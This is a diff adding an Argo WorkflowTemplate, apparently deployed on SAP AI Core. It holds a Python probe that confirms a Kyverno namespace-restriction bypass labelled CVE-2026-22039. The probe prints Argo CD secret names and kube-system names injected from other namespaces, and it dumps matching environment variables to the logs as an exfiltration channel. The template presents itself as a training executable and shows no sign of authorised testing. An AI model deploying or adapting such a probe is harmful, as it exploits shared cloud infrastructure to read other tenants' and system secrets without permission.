@@ -1,0 +1,45 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v11
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v11"
+    executables.ai.sap.com/description: "CVE-2026-22039 Kyverno cross-namespace exfil v2 - fixed policy"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        python3 - << 'EOF'
+        import os
+
+        def report(k, v):
+            print(f"[PT11] {k}: {str(v)[:50000]}", flush=True)
+
+        report("START", "probe-train-v11 - CVE-2026-22039 Kyverno namespace restriction bypass")
+
+        argocd_names = os.environ.get("KYVERNO_EXFIL_ARGOCD_NAMES", "")
+        kubesys      = os.environ.get("KYVERNO_EXFIL_KUBESYS_NAMES", "")
+
+        if argocd_names or kubesys:
+            report("CVE_2026_22039_STATUS", "CONFIRMED -- Kyverno mutated pod with cross-namespace data")
+            report("ARGOCD_SECRET_NAMES",  argocd_names)
+            report("KUBE_SYSTEM_NAMES",    kubesys)
+        else:
+            report("CVE_2026_22039_STATUS", "NOT_CONFIRMED -- env vars absent, policy may not have applied")
+
+        # Dump all env for diagnostics
+        for k in sorted(os.environ):
+            if any(x in k for x in ["KYVERNO", "EXFIL", "ARGO", "KUBE"]):
+                report(f"ENV_{k}", os.environ[k][:5000])
+
+        report("DONE", "probe-train-v11 complete")
+        EOF
+  entrypoint: probe
